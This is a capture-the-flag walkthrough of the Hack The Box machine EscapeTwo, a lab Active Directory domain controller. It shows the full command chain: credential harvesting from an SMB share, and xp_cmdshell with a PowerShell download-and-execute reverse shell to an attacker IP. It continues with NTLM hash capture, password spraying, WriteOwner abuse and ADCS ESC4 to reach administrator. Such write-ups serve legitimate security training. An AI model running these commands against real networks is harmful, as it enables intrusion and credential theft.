---
title: EscapeTwo
date: 2025-01-11 01:39:09 +/-0005
categories: [WalkThrough, HTB]
tags: [Active Directory, HTB, Easy, Windows]
---
---
description: 
---

![box-cover](https://cdn-images-1.medium.com/max/1000/1*uTFjAw7isucZ-gnSUXfMdA.jpeg)
_https://app.hackthebox.com/machines/EscapeTwo_

---

بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيم 
{: .text-center }


---


This is my comprehensive walkthrough for solving EscapeTwo, the first machine of Season 7 on Hack The Box. This machine, like many real-world Active Directory engagements, required a methodical approach, and a good understanding of AD exploitation. It provided an excellent opportunity to sharpen skills in enumeration, SQL exploitation, password spraying, and abusing ACLs, ADCS for privilege escalation.

The journey started with valid credentials provided as part of the challenge: rose / KxEPkKe6R8su. From there after some enumeration, I discovered an .xlsx file on an SMB share. After inspecting it, I realized it was a ZIP file containing additional files one of them had some users credentials. Using these, I accessed an MSSQL server and enabled xp_cmdshell to gain an initial shell as sql_svc.

Through further enumeration, I uncovered credentials for sql_svc in a configuration file located in the SQL2019 directory, leading to password spraying and identifying another user with password reuse. The privilege escalation phase involved abusing WriteOwner permissions over a user in the CERT PUBLISHERS group, leveraging ADCS ESC4 to obtain the Administrator hash.

Quite the exciting ride overcoming these challenges - so let's dive in!

---
## 1. Reconnaissance

### Network Scanning

![Nmap Scan](https://cdn-images-1.medium.com/max/1000/1*rZ8D7P_Vstya2Y37c5m74Q.png)


The Nmap scan reveals multiple open ports and services on the target. A Windows domain controller DC01 for the sequel.htb domain, hosting services such as Kerberos, LDAP, SMB, and DNS. Active Directory-related ports (88, 389, 636) are open, and SSL certificates indicate the domain name and computer identity. 

Additionally, Microsoft SQL Server 2019 is running on port 1433, presenting potential database exploitation opportunities. 

The presence of SMB with message signing enabled and required suggests limited SMB relay attacks.

Lets start adding domain to the hosts file for local resolution

```bash
echo '10.10.11.51  sequel.htb  dc01.sequel.htb' | sudo tee -a /etc/hosts
```

### Service Enumeration

checking if the credentials we have valid for any of the services 

![nxc](https://cdn-images-1.medium.com/max/1000/1*gasIYXDnd7T3wVjLdnD5Jw.png)


Credentials is valid for LDAP, MSSQL, SMB but not for WINRM 

#### 1. SSL/TLS

Start checking the SSL/TLS Certificate 

```
openssl s_client -showcerts -connect 10.10.11.51:3269 | openssl x509 -noout -text
```
![open ssl](https://cdn-images-1.medium.com/max/1000/1*Ps9nzvmkq2qyeuaQ9i6w1Q.png)

The issuer is sequel-DC01-CA, which appears to be an internal CA specific to the sequel.htb domain so we may encounter ADCS attacks if any of the templates is vulnerable.

#### 2. LDAP

To enumerate LDAP on this machine, you can extract all LDAP data using the ldapsearch

```bash
ldapsearch -H ldap://10.10.11.51 -D "rose@sequel.htb" -w 'KxEPkKe6R8su' -b "DC=sequel,DC=htb" | tee -a ldap.data
```

If you're looking for specific attributes, you can use LDAP queries with search filters. For example, to list all user account names:

```bash
ldapsearch -H ldap://10.10.11.51 -D "rose@sequel.htb" -w 'KxEPkKe6R8su' -b "DC=sequel,DC=htb" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | cut -d ':' -f 2
```
![users list](https://cdn-images-1.medium.com/max/1000/1*NwEYpgDeR5MTpICLFowO5g.png)

Store these valid users; we will need them later for password spraying.

For a more organized and categorized output, use ldapdomaindump to create a visual and structured representation of the data:

```bash
ldapdomaindump -u "sequel.htb\rose" -p KxEPkKe6R8su -o dump/ ldap://10.10.11.51
```

![ldapdomaindump](https://cdn-images-1.medium.com/max/1000/1*Jg64PTQEP9AFz-PqZeMkmQ.png)
![ldapdomaindump](https://cdn-images-1.medium.com/max/1000/1*KMpySyyfw5ioMBvB4PMJpQ.png)
![ldapdomaindump](https://cdn-images-1.medium.com/max/1000/1*cBAWeSBpNmUzznlKhoHNHA.png)


we have a list of valid users now and we know their groups and some other data about the environment 

we can use rpcclient to enumerate more data, but not important for me now

#### 3. MSSQL

```
mssqlclient.py -windows-auth sequel.htb/rose:KxEPkKe6R8su@10.10.11.51
```
![](https://cdn-images-1.medium.com/max/1000/1*dWfxlnYBW_AVmCdTeZjJiw.png)

After connecting, attempt to enumerate database configurations and user data for credentials and other stuff.

Next, try enabling xp_cmdshell to execute system commands Manually using

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
or using `mssqlclient` built-in command `enable_xp_cmdshell`
![](https://cdn-images-1.medium.com/max/1000/1*_msC25px31dhEZ1xiwGfSQ.png)

But we got an error, we do not have sufficient permissions 

![](https://cdn-images-1.medium.com/max/1000/1*3aOQ6zfyIqA4qbUgafWKUA.png)

next Check for linked servers to escalate privileges or access additional resources

##### Linked Server Abuse attack.

A linked server acts as a bridge between two servers. Linked servers in SQL Server allow one SQL Server instance to query another. If improperly configured or secured, they can be abused for privilege escalation, lateral movement, and data extraction.

+ **Enumerate Linked Servers**

    ```
    EXEC sp_linkedservers; 
    or
    enum_links
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*OcXjRGLJ2mRHrErtRGV-yw.png)

+ **Query the Linked Server DC01\SQLEXPRESS**

    ```
    EXEC ('SELECT name FROM master.dbo.sysdatabases') AT [DC01\SQLEXPRESS];
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*g7bFNMJAEtetwh13TiRB5w.png)

We couldn't locate or connect to the SQL Server instance

##### UNC Path Injection 

Last thing to try is to Forced Authentication attack for NTLM Hash Theft of the `SQL_SVC` user hash then try to crack it

+ Utilize Responder to capture a hash via SMB relay 

    ```bash
    sudo responder -I tun0 
    ```

+ Trigger an SMB request from MSSQL 

    ```
    xp_dirtree \\Your_IP\fake\share
    ```
![](https://cdn-images-1.medium.com/max/1000/1*CQjj-i9KJVzrtBo798n43Q.png)

+ Attempt to crack the captured hash using Hashcat, start it with the autodetect mode
```
hashcat hash /usr/share/wordlists/rockyou.txt
```
![](https://cdn-images-1.medium.com/max/1000/1*pVPPkt7ZekRS6PMee9u30Q.png)

Hash exhausted, unable to crack.
![](https://cdn-images-1.medium.com/max/1000/1*IZi_utBhTeeJTN5uxi-WKQ.png)

#### 4. SMB

+ First checking our rights over the shares 
    ```
    smbmap -d sequel.htb -u "rose" -p "KxEPkKe6R8su" -H 10.10.11.51
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*wfxNMrdPDp-O56JbBNBL_w.png)

    We have read permissions over Accounting Department share which is a custom share, the others are default.

+ Access this share

    ```
    smbclient "//10.10.11.51/Accounting Department" -U sequel.htb/rose%KxEPkKe6R8su
    ```


    After connecting i found two xlsx files, download them for check


    ```bash
    recurse on
    prompt OFF
    mget *
    ```
    {: .nolineno }

    ![](https://cdn-images-1.medium.com/max/1000/1*w4hbPYWrnTRmElADuGtFWg.png)

+ Checking the file type

    I tried to open them but there were an error so i check the file types and found they were actually zip files 

    ![](https://cdn-images-1.medium.com/max/1000/1*ILUr36yid2_JmjB-ZfpswQ.png)

+ Unzipping them
        ![](https://cdn-images-1.medium.com/max/1000/1*u3DVbqWd1uvQHpL7im_AaA.png)

    After some fetching i found credentials in the sharedStrings.xml file, i gathered these data in this md table

    | First Name | Last Name | Email             | Username | Password         |
    |------------|----------|-------------------|----------|------------------|
    | Angela     | Martin   | angela@sequel.htb | angela   | 0fwz7Q4mSpurIt99 |
    | Oscar      | Martinez | oscar@sequel.htb  | oscar    | 86LxLBMgEWaKUnBG |
    | Kevin      | Malone   | kevin@sequel.htb  | kevin    | Md9Wlq1E5bZnVDVo |
    | NULL       | NULL     | sa@sequel.htb     | sa       | MSSQLP@ssw0rd!   |


Only oscar cred was valid for SMB and nothing from password spraying
![](https://cdn-images-1.medium.com/max/1000/1*9wrjxqumYmopKRO8NKC8bA.png)
I tried enumerating with the Oscar user, but nothing significant was revealed. However, I already know from before about the SA user.

---

## 2. Initial Foothold

The SA user belongs to the sysadmin fixed server role, which grants full control over the SQL Server instance, including all databases, configurations, and system-level operations. During SQL Server installation, the SA account is created. 

So, I decided to give it a shot with mssqlclient, and it worked.

![](https://cdn-images-1.medium.com/max/1000/1*O_Am8iHYNf33_khE65cDZA.png)

+ Enable cmd shell
    
    We can now enable the xp_cmdshell and execute commands
    ![](https://cdn-images-1.medium.com/max/1000/1*PNTYh1cWsIX0L-tokpj-RQ.png)
 
+ Prepare reverse shell payload

    using [Invoke-PowerShellTcp](https://medium.com/r/?url=https%3A%2F%2Fraw.githubusercontent.com%2Fsamratashok%2Fnishang%2Frefs%2Fheads%2Fmaster%2FShells%2FInvoke-PowerShellTcp.ps1) reverse shell, add the following line to the bottom of the script

    ```
    Invoke-PowerShellTcp -Reverse -IPAddress 'Your_IP' -Port 4444
    ```



+ Start a Python HTTP server 
    ```python 
    python -m http.server 8080
    ```
+ Then, execute the reverse shell on the target
    ```
    xp_cmdshell powershell -c "IEX(curl -useb http://IP:8080/shell.ps1)"
    ```
    This successfully grants us a shell on the server as the as `sql_svc`
    ![](https://cdn-images-1.medium.com/max/1000/1*P9me_uAsbNYhwhoRm1b_2w.png)

After some enumeration, i found a directory for SQL2019 
    ![](https://cdn-images-1.medium.com/max/1000/1*Kj9Y_RpGgdGTN_NMj6yDIQ.png)
    ![](https://cdn-images-1.medium.com/max/1000/1*7cr-EWdPChpeqKtt0unrqw.png)
Inside it there were a configuration file which contains sql_svc password 
![](https://cdn-images-1.medium.com/max/1000/1*Sp-H5WPwKyo68UGUi1Uvyg.png)

We can now auth as sql_svc but we have a shell already we can try to auth via winrm for stable shell but sql_svc isn't part of the remote Management users, we know this from before from LDAP enum 

Then, I attempted a password spraying attack on the gathered users, and it worked.

```bash
nxc smb sequel.htb -u users.list -p "WqSZAF6CysDQbGb3" --continue-on-success
```

![](https://cdn-images-1.medium.com/max/1000/1*iRt15tZi7uwasMoQ8F3WdA.png)

We have the password of user ryan which is part of the remote Management group.

![](https://cdn-images-1.medium.com/max/1000/1*pLyM3khk44a5OfIF1YDveA.png)

---

## 3. Privilege Escalation
Gaining access to `ryan` user using `evil-winrm`
![](https://cdn-images-1.medium.com/max/1000/1*u_HjZP8luB1A-pPZxyhGzQ.png)

Most of the time i would run [WinPEAS](https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Fcarlospolop%2Fprivilege-escalation-awesome-scripts-suite%2Ftree%2Fmaster%2FwinPEAS) but i prefer to use bloodhound to know more about the environment and the priv we have over other resources 

Using [bloodhound CE](https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2FSpecterOps%2FBloodHound) for mapping the AD environment, it is better than the old one in somethings like ADCS attack path but still need way more modifications.

Start gathering data by running SharpHound ingestor or [BloodHound.py](https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Fdirkjanm%2FBloodHound.py%2Ftree%2Fbloodhound-ce), i just knew that it has specific version for bloodhound CE

[](https://cdn-images-1.medium.com/max/1000/1*1PknADCrSPkTHi4YyeEMdg.png)

User ryan has `WriteOwner` over `SA_SVC` which has **`ADCSESC4 `**

Abusing the `WriteOwner` privilege over the `CA_SVC` account to change the user password. In a real engagement, it is often better to modify other attributes, such as setting DONT_REQ_PREA`UTH for **ASREPRoast** or assigning an SPN to enable **Kerberoasting**, allowing you to retrieve and crack the account's NTLM hash. Modifying attributes is generally less noisy than directly changing the password.

Using **BloodyAD**, which is a powerful tool that combines a lot of functionality into one comprehensive suite.

1. Changes the owner of the CA_SVC account to ryan.

    ```
    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
    ```
2. Modifying  the DACL to give us *ryan* full control over the CA_SVC account.
    ```
    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan
    ```
3. Resets the password for the CA_SVC account to 
    ```
    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set password ca_svc 'newP@ssword2022'
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*lBLsHGpFsJlZhRTTZTRiGA.png)
We can now perform the **ADCSESC4** attack as we own the user `SA_SVC`
![](https://cdn-images-1.medium.com/max/1000/1*_FzXBj1AIMurvBtIRVMSRQ.png)
ESC4 arises when a non-administrator account has write access to a certificate template, enabling them to modify its permissions. This allows the attacker to grant themselves enrollment rights and issue certificates that provide elevated privileges, such as domain administrator or domain controller access. The vulnerability is due to improper access control on certificate templates.

Vulnerable certificate template to this attack may allow user or a group to perform actions such as modifying **Owner permissions**, adding or changing **WriteOwnerPrincipals**, **WriteDaclPrincipals**, and **WritePropertyPrincipals**, or even granting themselves **FullControl** over the template.
![](https://cdn-images-1.medium.com/max/1000/1*J5TxOsMMj8_noq9DvAsjhA.png)

So let's start our work

1. Enumerate the vulnerable templates
    ```
    certipy find -u ca_svc -p 'newP@ssword2022' -target sequel.htb -text -vulnerable
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*NZM-LdKil7MbYf3xc1l3vg.png)
    Our user is member of the group `Cert Publishers`
    ![](https://cdn-images-1.medium.com/max/1000/1*FvVYWN4M0Fomn6o6ZxNS0Q.png)
    We have the permissions over the template that enable us to perform this attack
2. Modifying the certificate template
    ```
    certipy template -u ca_svc -p 'newP@ssword2022' -template 'DunderMifflinAuthentication' -target sequel.htb -save-old
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*l3IkPAW-rzNzWpPDHcoG7Q.png)
3. Requesting a domain admin certificate using modified ESC4 template
    ```
    certipy req -ca sequel-DC01-CA -u ca_svc -p 'newP@ssword2022' -template 'DunderMifflinAuthentication' -target sequel.htb -upn administrator@sequel.htb 
    ```
    There is something important to know here we have to perform all these process from changing ca_svc user password to performing ESC4 attack so fast as there is a cleanup script running on the machine
    ```
    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan  && \
    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan   && \
    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set password ca_svc 'newP@ssword2022' && \

    certipy template -u ca_svc -p 'newP@ssword2022' -template 'DunderMifflinAuthentication' -target sequel.htb -save-old   && \
    certipy req -ca sequel-DC01-CA -u ca_svc -p 'newP@ssword2022' -template 'DunderMifflinAuthentication' -target sequel.htb -upn administrator@sequel.htb
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*witba01NKUAqLUSJ39g1gg.png)
4. Request a TGT using the certificate
    ```
    certipy auth -pfx administrator.pfx
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*vrLyXYWJJ8bwNSHOPwAhAw.png)
    Now we have access to the administrator account hash so we can auth using evil-winrm and grep the flags. 
    ![](https://cdn-images-1.medium.com/max/1000/1*DEHyT1Pt3tjstqE60fLblw.png)

---

## 4. Resources 

1. **[Abusing AD-DACL: WriteOwner](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)**
2. **[Active Directory Certificate Services (ADCS – ESC4)](https://rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/)**

